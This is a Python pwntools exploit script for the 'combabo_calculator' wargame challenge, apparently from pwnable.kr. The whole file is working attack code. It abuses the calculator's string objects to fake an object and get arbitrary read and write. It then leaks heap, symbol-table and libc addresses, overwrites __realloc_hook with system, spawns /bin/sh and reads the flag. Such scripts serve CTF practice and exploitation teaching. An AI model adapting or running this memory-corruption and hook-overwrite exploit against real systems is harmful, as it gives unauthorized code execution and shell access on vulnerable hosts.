#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("combabo_calculator")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 2222)
user = args.USER or "combabo_calculator"
password = args.PASSWORD or "guest"
remote_path = "combabo_calculator"

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    # shell.set_working_directory(symlink=True)
    shell.set_working_directory("/tmp/test100/combabo_calculator")


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Execute the target binary on the remote host"""
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.connect_remote("0.0.0.0", 9030)


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc = ELF("combabo.so.6")

context.terminal = ["kitty"]

STR = 12


def do_io(io: tube, line: bytes):
    io.sendline(line)
    data = io.recvuntil(b"\n>>> ", drop=True)
    return data


def create_adjacent_objs(io: tube):
    """creates two objects (a and b) so that b string is just before a"""
    do_io(io, b'a = "AAAA"')
    do_io(io, b'a = "AAAAAAAAAAAA"')  # free a's string (just before a)
    do_io(io, b'b = "BBBB"')  # reallocate it in b


def fake_a(io: tube, address: int):
    assert b"\x00" not in p32(address)
    do_io(io, b"b = 256")
    do_io(
        io,
        b'b = "%s"'
        % (b"B" * 12 + b"S" * 4 + p32(address) * 2 + p32(0x7FFFFFFF) + p8(STR)),
    )  # object is allocated right after its data, override it.


def write_what_where(io: tube, what: bytes, where: int):
    assert b"\x00" not in what
    fake_a(io, where)
    do_io(io, b'a = "%s"' % (what))


def read_where(io: tube, where: int):
    fake_a(io, where)
    return do_io(io, b"a")


def break_heap_adderss(io: tube) -> int:
    # reallocate first object string (since by default it is almost aligned to 256 and thus will never leak anything)
    do_io(io, b'a = "%s"' % (b"A" * 20,))

    # overwrite a's string pointer's LSB with 0 (the null terminator)
    do_io(io, b"b = 256")
    do_io(io, b'b = "%s"' % (b"B" * 20,))

    # fixup checksum
    do_io(io, b'a = ""')
    do_io(io, b"a = 256")

    # allocate a new symbol - will be allocated at the start of the 256 bytes block of a's string and will thus be leaked
    do_io(io, b'c = "%s"' % (b"C" * 20,))

    return u32(do_io(io, b"a"))


def read_symtab_address(io: tube, heap_address: int):
    return u32(
        read_where(io, heap_address + 664 + 12)
    )  # obtained using a debugger on the remote machine assuming the allocation order shouldn't change much


def read_libc_base(io: tube, symtab_address: int):
    realloc_got_address = (
        symtab_address - 196
    )  # 196 was found be enumerating all possible offsets until finding a got pointer that has the same alignment as realloc
    realloc_address = u32(read_where(io, realloc_got_address))
    libc.address = realloc_address - libc.sym["realloc"]


def override_realloc_hook(io: tube):
    write_what_where(io, p32(libc.sym["system"]), libc.sym["__realloc_hook"])


def pop_shell(io: tube):
    # trigger realloc on /bin/sh
    do_io(io, b'z = "/bin/sh"')
    io.sendline(b'z = "ZZZZZZZZZZZZZZZZZZ"')


io = start()
io.recvuntil(b">>> ")

create_adjacent_objs(io)

heap_address = break_heap_adderss(io)
success(f"broke heap addr: 0x{heap_address:x}")

symtab_address = read_symtab_address(io, heap_address)
success(f"broke symtab addr: 0x{symtab_address:x}")

read_libc_base(io, symtab_address)
success(f"broke libc base: 0x{libc.address:x}")

info("overriding realloc hook")
override_realloc_hook(io)

info("spawning shell")
pop_shell(io)

io.sendline(b"echo MARKER; cat flag")
io.recvuntil(b"MARKER\n")
io.recvline()
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
